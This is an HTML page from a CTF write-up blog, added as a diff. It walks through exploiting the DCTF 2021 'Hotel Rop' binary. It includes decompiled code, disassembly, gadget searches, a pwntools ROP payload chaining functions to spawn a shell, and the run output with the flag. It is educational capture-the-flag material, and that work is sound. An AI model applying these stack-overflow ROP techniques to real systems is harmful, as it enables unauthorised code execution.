@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Hotel Rop</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Hotel Rop</h1>
+</header>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1"></a>$ <span class="ex">checksec</span> --file hotel_rop</span>
+<span id="cb1-2"><a href="#cb1-2"></a><span class="ex">RELRO</span>           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span>
+<span id="cb1-3"><a href="#cb1-3"></a><span class="ex">Partial</span> RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   hotel_rop</span></code></pre></div>
+<p><em>vuln</em> function allows to input <em>0x100</em> bytes, functions <em>california</em> and <em>silicon_valley</em> assign <em>“/bin/sh”</em> to <em>win_land</em>, function <em>loss</em> calls <em>system(win_land)</em> if <em>param_1</em> is <em>0x1337c0de</em> and sum of <em>param_1</em> and <em>param_2</em> equals to <em>0xdeadc0de</em>. To use ROP to exploit, needed to call <em>california</em>, then <em>silicon_valley</em>, and finally <em>loss</em> to spawn a shell.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1"></a><span class="dt">void</span> california(<span class="dt">void</span>)</span>
+<span id="cb2-2"><a href="#cb2-2"></a>{</span>
+<span id="cb2-3"><a href="#cb2-3"></a>  puts(<span class="st">&quot;Welcome to Hotel California&quot;</span>);</span>
+<span id="cb2-4"><a href="#cb2-4"></a>  puts(<span class="st">&quot;You can sign out anytime you want, but you can never leave&quot;</span>);</span>
+<span id="cb2-5"><a href="#cb2-5"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x2f</span>;</span>
+<span id="cb2-6"><a href="#cb2-6"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-7"><a href="#cb2-7"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x62</span>;</span>
+<span id="cb2-8"><a href="#cb2-8"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-9"><a href="#cb2-9"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x69</span>;</span>
+<span id="cb2-10"><a href="#cb2-10"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-11"><a href="#cb2-11"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x6e</span>;</span>
+<span id="cb2-12"><a href="#cb2-12"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-13"><a href="#cb2-13"></a>  <span class="cf">return</span>;</span>
+<span id="cb2-14"><a href="#cb2-14"></a>}</span>
+<span id="cb2-15"><a href="#cb2-15"></a></span>
+<span id="cb2-16"><a href="#cb2-16"></a><span class="dt">void</span> silicon_valley(<span class="dt">void</span>)</span>
+<span id="cb2-17"><a href="#cb2-17"></a>{</span>
+<span id="cb2-18"><a href="#cb2-18"></a>  puts(<span class="st">&quot;You want to work for Google?&quot;</span>);</span>
+<span id="cb2-19"><a href="#cb2-19"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x2f</span>;</span>
+<span id="cb2-20"><a href="#cb2-20"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-21"><a href="#cb2-21"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x73</span>;</span>
+<span id="cb2-22"><a href="#cb2-22"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-23"><a href="#cb2-23"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="bn">0x68</span>;</span>
+<span id="cb2-24"><a href="#cb2-24"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-25"><a href="#cb2-25"></a>  *(undefined *)((<span class="dt">long</span>)&amp;win_land + (<span class="dt">long</span>)len) = <span class="dv">0</span>;</span>
+<span id="cb2-26"><a href="#cb2-26"></a>  len = len + <span class="dv">1</span>;</span>
+<span id="cb2-27"><a href="#cb2-27"></a>  <span class="cf">return</span>;</span>
+<span id="cb2-28"><a href="#cb2-28"></a>}</span>
+<span id="cb2-29"><a href="#cb2-29"></a></span>
+<span id="cb2-30"><a href="#cb2-30"></a><span class="dt">void</span> loss(<span class="dt">int</span> param_1,<span class="dt">int</span> param_2)</span>
+<span id="cb2-31"><a href="#cb2-31"></a>{</span>
+<span id="cb2-32"><a href="#cb2-32"></a>  <span class="cf">if</span> (param_2 + param_1 == -<span class="bn">0x21523f22</span>) {</span>
+<span id="cb2-33"><a href="#cb2-33"></a>    puts(<span class="st">&quot;Dis is da wae to be one of our finest guests!&quot;</span>);</span>
+<span id="cb2-34"><a href="#cb2-34"></a>    <span class="cf">if</span> (param_1 == <span class="bn">0x1337c0de</span>) {</span>
+<span id="cb2-35"><a href="#cb2-35"></a>      puts(<span class="st">&quot;Now you can replace our manager!&quot;</span>);</span>
+<span id="cb2-36"><a href="#cb2-36"></a>      system((<span class="dt">char</span> *)&amp;win_land);</span>
+<span id="cb2-37"><a href="#cb2-37"></a>                    <span class="co">/* </span><span class="al">WARNING</span><span class="co">: Subroutine does not return */</span></span>
+<span id="cb2-38"><a href="#cb2-38"></a>      exit(<span class="dv">0</span>);</span>
+<span id="cb2-39"><a href="#cb2-39"></a>    }</span>
+<span id="cb2-40"><a href="#cb2-40"></a>  }</span>
+<span id="cb2-41"><a href="#cb2-41"></a>  <span class="cf">return</span>;</span>
+<span id="cb2-42"><a href="#cb2-42"></a>}</span>
+<span id="cb2-43"><a href="#cb2-43"></a></span>
+<span id="cb2-44"><a href="#cb2-44"></a><span class="dt">void</span> vuln(<span class="dt">void</span>)</span>
+<span id="cb2-45"><a href="#cb2-45"></a>{</span>
+<span id="cb2-46"><a href="#cb2-46"></a>  <span class="dt">char</span> local_28 [<span class="dv">28</span>];</span>
+<span id="cb2-47"><a href="#cb2-47"></a>  <span class="dt">int</span> local_c;</span>
+<span id="cb2-48"><a href="#cb2-48"></a>  </span>
+<span id="cb2-49"><a href="#cb2-49"></a>  puts(<span class="st">&quot;You come here often?&quot;</span>);</span>
+<span id="cb2-50"><a href="#cb2-50"></a>  fgets(local_28,<span class="bn">0x100</span>,stdin);</span>
+<span id="cb2-51"><a href="#cb2-51"></a>  <span class="cf">if</span> (local_c == <span class="dv">0</span>) {</span>
+<span id="cb2-52"><a href="#cb2-52"></a>    puts(<span class="st">&quot;Oh! You are already a regular visitor!&quot;</span>);</span>
+<span id="cb2-53"><a href="#cb2-53"></a>  }</span>
+<span id="cb2-54"><a href="#cb2-54"></a>  <span class="cf">else</span> {</span>
+<span id="cb2-55"><a href="#cb2-55"></a>    puts(<span class="st">&quot;I think you should come here more often.&quot;</span>);</span>
+<span id="cb2-56"><a href="#cb2-56"></a>  }</span>
+<span id="cb2-57"><a href="#cb2-57"></a>  <span class="cf">return</span>;</span>
+<span id="cb2-58"><a href="#cb2-58"></a>}</span></code></pre></div>
+<h3 id="address-of-the-three">Address Of The Three</h3>
+<p>The program printed address of <em>main</em> function, with it we could find address of the three functions about to call by adding the difference.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1"></a>main_addr <span class="op">=</span> pr.readline().strip().decode()</span>
+<span id="cb3-2"><a href="#cb3-2"></a>main_addr <span class="op">=</span> <span class="bu">int</span>(main_addr[main_addr.find(<span class="st">&#39;street &#39;</span>)<span class="op">+</span><span class="dv">7</span>:], <span class="dv">16</span>)</span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="bu">print</span>(<span class="st">&#39;main @&#39;</span>, <span class="bu">hex</span>(main_addr))</span>
+<span id="cb3-4"><a href="#cb3-4"></a></span>
+<span id="cb3-5"><a href="#cb3-5"></a>ca_addr <span class="op">=</span> main_addr <span class="op">+</span> (elf.sym[<span class="st">&#39;california&#39;</span>]<span class="op">-</span>elf.sym[<span class="st">&#39;main&#39;</span>])</span>
+<span id="cb3-6"><a href="#cb3-6"></a>si_addr <span class="op">=</span> main_addr <span class="op">+</span> (elf.sym[<span class="st">&#39;silicon_valley&#39;</span>]<span class="op">-</span>elf.sym[<span class="st">&#39;main&#39;</span>])</span>
+<span id="cb3-7"><a href="#cb3-7"></a>loss_addr <span class="op">=</span> main_addr <span class="op">+</span> (elf.sym[<span class="st">&#39;loss&#39;</span>]<span class="op">-</span>elf.sym[<span class="st">&#39;main&#39;</span>])</span></code></pre></div>
+<h3 id="pass-the-parameters">Pass The Parameters</h3>
+<p>According to <em>objdump</em> output, <em>loss</em> used register <em>edi</em> and <em>esi</em> for the two parameters. The payload format was <code>&lt;padding&gt;&lt;california address&gt;&lt;silicon_valley address&gt;&lt;pop rdi gadget&gt;&lt;0x1337c0de&gt;&lt;pop rsi gadget&gt;&lt;0xdeadc0de-0x1337c0de&gt;&lt;loss address&gt;</code>.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb4-1"><a href="#cb4-1"></a><span class="dv">0000000000001185</span> &lt;loss&gt;:</span>
+<span id="cb4-2"><a href="#cb4-2"></a><span class="fu">    1185:</span>       <span class="dv">55</span>                      <span class="bu">push</span>   %<span class="kw">rbp</span></span>
+<span id="cb4-3"><a href="#cb4-3"></a><span class="fu">    1186:</span>       <span class="dv">48</span> <span class="dv">89</span> e5                <span class="bu">mov</span>    %<span class="kw">rsp</span>,%<span class="kw">rbp</span></span>
+<span id="cb4-4"><a href="#cb4-4"></a><span class="fu">    1189:</span>       <span class="dv">48</span> <span class="dv">83</span> ec <span class="dv">10</span>             <span class="bu">sub</span>    <span class="dv">$</span><span class="bn">0x10,</span>%<span class="kw">rsp</span></span>
+<span id="cb4-5"><a href="#cb4-5"></a><span class="fu">    118d:</span>       <span class="dv">89</span> 7d fc                <span class="bu">mov</span>    %<span class="kw">edi</span>,-<span class="bn">0x4</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-6"><a href="#cb4-6"></a><span class="fu">    1190:</span>       <span class="dv">89</span> <span class="dv">75</span> f8                <span class="bu">mov</span>    %<span class="kw">esi</span>,-<span class="bn">0x8</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-7"><a href="#cb4-7"></a><span class="fu">    1193:</span>       8b <span class="dv">55</span> fc                <span class="bu">mov</span>    <span class="bn">-0x4</span>(%<span class="kw">rbp</span>),%<span class="kw">edx</span></span>
+<span id="cb4-8"><a href="#cb4-8"></a><span class="fu">    1196:</span>       8b <span class="dv">45</span> f8                <span class="bu">mov</span>    <span class="bn">-0x8</span>(%<span class="kw">rbp</span>),%<span class="kw">eax</span></span>
+<span id="cb4-9"><a href="#cb4-9"></a><span class="fu">    1199:</span>       <span class="dv">01</span> d0                   <span class="bu">add</span>    %<span class="kw">edx</span>,%<span class="kw">eax</span></span>
+<span id="cb4-10"><a href="#cb4-10"></a><span class="fu">    119b:</span>       3d de c0 ad de          <span class="bu">cmp</span>    <span class="dv">$</span><span class="bn">0xdeadc0de</span>,%<span class="kw">eax</span></span>
+<span id="cb4-11"><a href="#cb4-11"></a><span class="fu">    11a0:</span>       <span class="dv">75</span> <span class="dv">37</span>                   <span class="bu">jne</span>    11d9 &lt;loss+<span class="bn">0x54</span>&gt;</span>
+<span id="cb4-12"><a href="#cb4-12"></a><span class="fu">    11a2:</span>       <span class="dv">48</span> 8d 3d 5f 0e <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0xe5f</span>(%rip),%<span class="kw">rdi</span>        # <span class="dv">2008</span> &lt;_IO_stdin_used+<span class="bn">0x8</span>&gt;</span>
+<span id="cb4-13"><a href="#cb4-13"></a><span class="fu">    11a9:</span>       e8 <span class="dv">82</span> fe ff ff          callq  <span class="dv">1030</span> &lt;puts@plt&gt;</span>
+<span id="cb4-14"><a href="#cb4-14"></a><span class="fu">    11ae:</span>       <span class="dv">81</span> 7d fc de c0 <span class="dv">37</span> <span class="dv">13</span>    cmpl   <span class="dv">$</span><span class="bn">0x1337c0de,</span>-<span class="bn">0x4</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-15"><a href="#cb4-15"></a><span class="fu">    11b5:</span>       <span class="dv">75</span> <span class="dv">22</span>                   <span class="bu">jne</span>    11d9 &lt;loss+<span class="bn">0x54</span>&gt;</span>
+<span id="cb4-16"><a href="#cb4-16"></a><span class="fu">    11b7:</span>       <span class="dv">48</span> 8d 3d 7a 0e <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0xe7a</span>(%rip),%<span class="kw">rdi</span>        # <span class="dv">2038</span> &lt;_IO_stdin_used+<span class="bn">0x38</span>&gt;</span>
+<span id="cb4-17"><a href="#cb4-17"></a><span class="fu">    11be:</span>       e8 6d fe ff ff          callq  <span class="dv">1030</span> &lt;puts@plt&gt;</span>
+<span id="cb4-18"><a href="#cb4-18"></a><span class="fu">    11c3:</span>       <span class="dv">48</span> 8d 3d a6 2e <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0x2ea6</span>(%rip),%<span class="kw">rdi</span>        # <span class="dv">4070</span> &lt;win_land&gt;</span>
+<span id="cb4-19"><a href="#cb4-19"></a><span class="fu">    11ca:</span>       e8 <span class="dv">71</span> fe ff ff          callq  <span class="dv">1040</span> &lt;system@plt&gt;</span>
+<span id="cb4-20"><a href="#cb4-20"></a><span class="fu">    11cf:</span>       bf <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span>          <span class="bu">mov</span>    <span class="dv">$</span><span class="bn">0x0,</span>%<span class="kw">edi</span></span>
+<span id="cb4-21"><a href="#cb4-21"></a><span class="fu">    11d4:</span>       e8 a7 fe ff ff          callq  <span class="dv">1080</span> &lt;exit@plt&gt;</span>
+<span id="cb4-22"><a href="#cb4-22"></a><span class="fu">    11d9:</span>       <span class="dv">90</span>                      <span class="bu">nop</span></span>
+<span id="cb4-23"><a href="#cb4-23"></a><span class="fu">    11da:</span>       c9                      leaveq </span>
+<span id="cb4-24"><a href="#cb4-24"></a><span class="fu">    11db:</span>       c3                      retq </span></code></pre></div>
+<p><em>pwn.rop</em> couldn’t find <em>‘pop rsi;ret’</em> gadget, an alternative was <em>‘pop rsi ; pop r15 ; ret’</em>.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1"></a>$ <span class="ex">ROPgadget</span> --binary hotel_rop <span class="kw">|</span><span class="fu">grep</span> pop<span class="dt">\ </span>rsi</span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="ex">0x0000000000001409</span> : pop rsi <span class="kw">;</span> <span class="ex">pop</span> r15 <span class="kw">;</span> <span class="ex">ret</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1"></a>pop_rdi <span class="op">=</span> pwn.p64(main_addr<span class="op">+</span>(rop.find_gadget([<span class="st">&#39;pop rdi&#39;</span>, <span class="st">&#39;ret&#39;</span>]).address<span class="op">-</span>elf.sym[<span class="st">&#39;main&#39;</span>]))</span>
+<span id="cb6-2"><a href="#cb6-2"></a>pop_rsi <span class="op">=</span> pwn.p64(main_addr<span class="op">+</span>(rop.find_gadget([<span class="st">&#39;pop rsi&#39;</span>, <span class="st">&#39;pop r15&#39;</span>, <span class="st">&#39;ret&#39;</span>]).address<span class="op">-</span>elf.sym[<span class="st">&#39;main&#39;</span>]))</span></code></pre></div>
+<h3 id="padding-size">Padding Size</h3>
+<p>Used cyclic string to find padding, which is 40 bytes for this program.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a><span class="ex">gef</span>➤  pattern create 100   </span>
+<span id="cb7-2"><a href="#cb7-2"></a>[<span class="ex">+</span>] Generating a pattern of 100 bytes</span>
+<span id="cb7-3"><a href="#cb7-3"></a><span class="ex">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>       </span>
+<span id="cb7-4"><a href="#cb7-4"></a>[<span class="ex">+</span>] Saved as <span class="st">&#39;$_gef0&#39;</span>                                                               </span>
+<span id="cb7-5"><a href="#cb7-5"></a><span class="ex">gef</span>➤  r                                                                                                                                                                 </span>
+<span id="cb7-6"><a href="#cb7-6"></a><span class="ex">Starting</span> program: /home/zex/lab_ex/hacking-lab/dctf-2021/hotel-rop/hotel_rop                                                                                            </span>
+<span id="cb7-7"><a href="#cb7-7"></a><span class="ex">Welcome</span> to Hotel ROP, on main street 0x55555555536d                                                                                                                     </span>
+<span id="cb7-8"><a href="#cb7-8"></a><span class="ex">You</span> come here often?                                                                </span>
+<span id="cb7-9"><a href="#cb7-9"></a><span class="ex">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>  </span>
+<span id="cb7-10"><a href="#cb7-10"></a><span class="ex">...</span></span>
+<span id="cb7-11"><a href="#cb7-11"></a>[#<span class="ex">0</span>] Id 1, Name: <span class="st">&quot;hotel_rop&quot;</span>, stopped 0x55555555536c in vuln (), <span class="ex">reason</span>: SIGSEGV</span>
+<span id="cb7-12"><a href="#cb7-12"></a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">trace</span> ────</span>
+<span id="cb7-13"><a href="#cb7-13"></a>[#<span class="ex">0</span>] 0x55555555536c → vuln()</span>
+<span id="cb7-14"><a href="#cb7-14"></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb7-15"><a href="#cb7-15"></a><span class="ex">gef</span>➤  info frame</span>
+<span id="cb7-16"><a href="#cb7-16"></a><span class="ex">Stack</span> level 0, frame at 0x7fffffffdac8:</span>
+<span id="cb7-17"><a href="#cb7-17"></a> <span class="ex">rip</span> = 0x55555555536c in vuln<span class="kw">;</span> <span class="ex">saved</span> rip = 0x6161616161616166</span>
+<span id="cb7-18"><a href="#cb7-18"></a> <span class="ex">called</span> by frame at 0x7fffffffdad8</span>
+<span id="cb7-19"><a href="#cb7-19"></a> <span class="ex">Arglist</span> at 0x6161616161616165, args: </span>
+<span id="cb7-20"><a href="#cb7-20"></a> <span class="ex">Locals</span> at 0x6161616161616165, Previous frame<span class="st">&#39;s sp is 0x7fffffffdad0</span></span>
+<span id="cb7-21"><a href="#cb7-21"></a><span class="st"> Saved registers:</span></span>
+<span id="cb7-22"><a href="#cb7-22"></a><span class="st">  rip at 0x7fffffffdac8</span></span>
+<span id="cb7-23"><a href="#cb7-23"></a><span class="st">gef➤  pattern search 0x6161616161616166</span></span>
+<span id="cb7-24"><a href="#cb7-24"></a><span class="st">[+] Searching &#39;</span>0x6161616161616166<span class="st">&#39;</span></span>
+<span id="cb7-25"><a href="#cb7-25"></a><span class="st">[+] Found at offset 40 (little-endian search) likely</span></span>
+<span id="cb7-26"><a href="#cb7-26"></a><span class="st">[+] Found at offset 33 (big-endian search) </span></span></code></pre></div>
+<h3 id="cat-flag.txt">Cat Flag.txt</h3>
+<p>The payload can be prepared as follow.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1"></a></span>
+<span id="cb8-2"><a href="#cb8-2"></a>payload <span class="op">=</span> b<span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">40</span></span>
+<span id="cb8-3"><a href="#cb8-3"></a>payload <span class="op">+=</span> pwn.p64(ca_addr)</span>
+<span id="cb8-4"><a href="#cb8-4"></a>payload <span class="op">+=</span> pwn.p64(si_addr)</span>
+<span id="cb8-5"><a href="#cb8-5"></a>payload <span class="op">+=</span> pop_rdi <span class="op">+</span> pwn.p64(<span class="bn">0x1337c0de</span>)</span>
+<span id="cb8-6"><a href="#cb8-6"></a>payload <span class="op">+=</span> pop_rsi <span class="op">+</span> pwn.p64(<span class="bn">0xcb760000</span>) <span class="op">+</span> pwn.p64(<span class="bn">0xcb760000</span>)</span>
+<span id="cb8-7"><a href="#cb8-7"></a>payload <span class="op">+=</span> pwn.p64(loss_addr)</span></code></pre></div>
+<p>With prepared payload can finally request to print the flag.</p>
+<pre><code>print(len(payload), payload)
+pr.sendafter(&#39;often?\n&#39;, payload)
+pr.sendline()
+pr.sendline(&#39;cat flag.txt&#39;)
+print(pr.readall(4))</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1"></a>$ <span class="ex">python3</span> exploit.py </span>
+<span id="cb10-2"><a href="#cb10-2"></a>[<span class="ex">+</span>] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done</span>
+<span id="cb10-3"><a href="#cb10-3"></a>[<span class="ex">*</span>] <span class="st">&#39;/home/zex/lab_ex/hacking-lab/dctf-2021/hotel-rop/hotel_rop&#39;</span></span>
+<span id="cb10-4"><a href="#cb10-4"></a>    <span class="ex">Arch</span>:     amd64-64-little</span>
+<span id="cb10-5"><a href="#cb10-5"></a>    <span class="ex">RELRO</span>:    Partial RELRO</span>
+<span id="cb10-6"><a href="#cb10-6"></a>    <span class="ex">Stack</span>:    No canary found</span>
+<span id="cb10-7"><a href="#cb10-7"></a>    <span class="ex">NX</span>:       NX enabled</span>
+<span id="cb10-8"><a href="#cb10-8"></a>    <span class="ex">PIE</span>:      PIE enabled</span>
+<span id="cb10-9"><a href="#cb10-9"></a>[<span class="ex">*</span>] Loaded 14 cached gadgets for <span class="st">&#39;hotel_rop&#39;</span></span>
+<span id="cb10-10"><a href="#cb10-10"></a><span class="ex">main</span> @ 0x5611556aa36d</span>
+<span id="cb10-11"><a href="#cb10-11"></a><span class="ex">ca</span> @ 0x5611556aa1dc</span>
+<span id="cb10-12"><a href="#cb10-12"></a><span class="ex">si</span> @ 0x5611556aa283</span>
+<span id="cb10-13"><a href="#cb10-13"></a><span class="ex">loss</span> @ 0x5611556aa185</span>
+<span id="cb10-14"><a href="#cb10-14"></a><span class="ex">104</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdc\xa1jU\x11V\x00\x00\x83\xa2jU\x11V\x00\x00\x0b\xa4jU\x11V\x00\x00\xde\xc07\x13\x00\x00\x00\x00\t\xa4jU\x11V\x00\x00\x00\x00v\xcb\x00\x00\x00\x00\x00\x00v\xcb\x00\x00\x00\x00\x85\xa1jU\x11V\x00\x00&#39;</span></span>
+<span id="cb10-15"><a href="#cb10-15"></a>[<span class="ex">+</span>] Receiving all data: Done (257B)</span>
+<span id="cb10-16"><a href="#cb10-16"></a>[<span class="ex">*</span>] Closed connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io port 7480</span>
+<span id="cb10-17"><a href="#cb10-17"></a><span class="ex">b</span><span class="st">&#39;I think you should come here more often.\nWelcome to Hotel California\nYou can sign out anytime you want, but you can never leave\nYou want to work for Google?\nDis is da wae to be one of our finest guests!\nNow you can replace our manager!\ndctf{ch41n_0f_h0t3ls}&#39;</span></span></code></pre></div>
+<p>For full source code checkout <a href="https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/hotel-rop/exploit.py">here</a>.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
